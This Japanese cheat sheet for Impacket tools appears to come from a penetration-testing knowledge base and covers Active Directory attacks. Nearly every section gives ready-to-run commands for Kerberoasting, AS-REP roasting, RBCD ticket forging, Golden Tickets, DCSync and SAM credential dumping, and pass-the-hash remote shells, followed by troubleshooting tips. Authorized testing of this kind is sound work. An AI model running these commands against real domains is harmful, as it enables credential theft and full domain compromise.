# Impacket スイート クイックリファレンス

> **スコープ**: AD 環境での攻撃・調査に使う Impacket ツール群のまとめ。認証情報（パスワード / NTLM ハッシュ / Kerberos チケット）を取得した後の各種攻撃手法で利用する。ペネトレ用 Linux ディストリ標準搭載（`pipx install impacket` で追加インストール可）。

## 着火条件

- AD 環境に認証情報を持って侵入した直後
- DCSync / Pass-The-Hash / Kerberos 攻撃 / コンピューターアカウント作成等を行う場合
- WinRM が閉じており impacket-psexec / wmiexec 等の代替シェルが必要な場合

---

## アカウント操作

### addcomputer.py — コンピューターアカウントの作成

```bash
impacket-addcomputer \
  -computer-name '[CASE_ID]_TEST$' \
  -computer-pass '[CLIENT_PROVIDED_PASSWORD]' \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[USER]:[PASSWORD]'
```

**用途:** RBCD 攻撃の準備。`SeMachineAccountPrivilege` が必要。

---

## Kerberos 関連

### GetUserSPNs.py — Kerberoasting

```bash
impacket-GetUserSPNs \
  '[DOMAIN]/[USER]:[PASSWORD]' \
  -dc-ip [DC_IP] \
  -request \
  -outputfile kerberoast.txt
```

### GetNPUsers.py — ASREPRoasting

```bash
impacket-GetNPUsers \
  '[DOMAIN]/' \
  -usersfile users.txt \
  -no-pass \
  -dc-ip [DC_IP] \
  -format hashcat
```

### getST.py — S4U2Self/S4U2Proxy でサービスチケット取得

```bash
impacket-getST \
  -spn 'cifs/[DC_FQDN]' \
  -impersonate administrator \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CASE_ID]_TEST$:[CLIENT_PROVIDED_PASSWORD]'
```

**用途:** RBCD 攻撃の Step 3。Administrator の TGS を取得する。

### ticketer.py — Golden / Silver Ticket の作成

```bash
# Golden Ticket
impacket-ticketer \
  -nthash [KRBTGT_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain [DOMAIN] \
  Administrator
```

---

## 権限設定

### rbcd.py — RBCD の設定

```bash
impacket-rbcd \
  -delegate-to '[DC_HOSTNAME]$' \
  -delegate-from '[CASE_ID]_TEST$' \
  -action write \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[USER]:[PASSWORD]'
```

---

## 認証情報のダンプ

### secretsdump.py — DCSync / ローカルダンプ

```bash
# DCSync（パスワード認証）
impacket-secretsdump \
  -just-dc-ntlm \
  '[DOMAIN]/[USER]:[PASSWORD]@[DC_FQDN]'

# DCSync（NTLM ハッシュ認証）
impacket-secretsdump \
  -hashes :[NTLM_HASH] \
  -just-dc-ntlm \
  '[DOMAIN]/Administrator@[DC_FQDN]'

# DCSync（Kerberos チケット）
export KRB5CCNAME=/path/to/ticket.ccache
impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  'administrator@[DC_FQDN]'

# ローカル SAM ダンプ
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

## リモート実行

### psexec.py — SMB 経由のコマンド実行（SYSTEM権限）

```bash
impacket-psexec '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
impacket-psexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[IP]'
```

### wmiexec.py — WMI 経由のコマンド実行

```bash
impacket-wmiexec '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
```

### smbexec.py — SMB 経由（psexec より静かな手法）

```bash
impacket-smbexec '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
```

---

## 調査・列挙

### GetADUsers.py — ドメインユーザー一覧の高速取得

```bash
# [Attacker] ドメイン全ユーザーの一覧（メール・PasswordLastSet・LastLogon 含む）
impacket-GetADUsers -all '[DOMAIN]/[USER]:[PASSWORD]' -dc-ip [DC_IP]

# Pass-The-Hash 版
impacket-GetADUsers -all -hashes :[NTLM_HASH] '[DOMAIN]/[USER]' -dc-ip [DC_IP]
```

**用途:** `ldapsearch` の生クエリより手軽にユーザー一覧を取得したいとき。`PasswordLastSet` / `LastLogon` カラムから「最近ログインしたアカウント = アクティブな攻撃対象」を判別できる。

**`ldapsearch` との使い分け：**

| 観点 | 使うツール |
|------|----------|
| 全ユーザーの基本属性をテーブル形式で素早く確認したい | `GetADUsers.py` |
| 特定の属性（`info`, `description`, `userAccountControl` のビット）でフィルタしたい | `ldapsearch`（`../01_Reconnaissance/LDAP_Enumeration.md`）|
| SPN / DONT_REQ_PREAUTH 等のセキュリティ属性で絞りたい | `ldapsearch`（OID `1.2.840.113556.1.4.803` ビット指定）|

### lookupsid.py — SID / RID ブルートフォース

```bash
impacket-lookupsid '[DOMAIN]/[USER]:[PASSWORD]@[DC_IP]'
# ドメイン内の全ユーザー・グループの SID と名前を列挙
```

### smbclient.py — SMB クライアント

```bash
impacket-smbclient '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
```

---

## 共通のオプション

| オプション | 説明 |
|-----------|------|
| `-k -no-pass` | Kerberos 認証を使用（KRB5CCNAME 環境変数が必要） |
| `-hashes :[NTLM_HASH]` | Pass-The-Hash |
| `-dc-ip [DC_IP]` | DC の IP アドレスを直接指定（DNS 解決を回避） |
| `-target-ip [IP]` | ターゲットの IP を直接指定 |

---

## 刺さらなかったとき

| 状況 | 原因・対処 |
|------|-----------|
| `KRB_AP_ERR_SKEW` | 時刻のずれ。`sudo ntpdate [DC_IP]` で同期してから再試行 |
| `FQDN で接続できない` | `/etc/hosts` に `[DC_IP] [DC_FQDN]` を登録する |
| `ACCESS_DENIED` | 認証情報に権限がない。Pass-The-Hash の場合はハッシュを再確認 |
| Kerberos チケット認証が失敗 | `export KRB5CCNAME=./ticket.ccache` を忘れている |

---

## 注意点・落とし穴

- ツール名は `impacket-[toolname]` または `python3 /path/to/[toolname].py` の2通りがある
- `-just-dc-ntlm` を付けずに secretsdump を実行すると大量の出力が出るため注意
- Kerberos 認証使用時は時刻同期が必須（`sudo ntpdate [DC_IP]`）
- `[DC_FQDN]` は FQDN（完全修飾ドメイン名）を使用。IPアドレスでは Kerberos 認証が失敗する場合がある

---

## 関連技術
- 関連：`../04_Post_Access_Windows_AD/Kerberos_Attacks/Kerberoasting.md`（GetUserSPNs）
- 関連：`../04_Post_Access_Windows_AD/Kerberos_Attacks/ASREPRoasting.md`（GetNPUsers）
- 関連：`../04_Post_Access_Windows_AD/Delegation_Attacks/RBCD.md`（getST・rbcd）
- 関連：`../04_Post_Access_Windows_AD/Credential_Dumping.md`（secretsdump）
- 関連：`../04_Post_Access_Windows_AD/Kerberos_Attacks/Pass_The_Ticket.md`（ticketer）
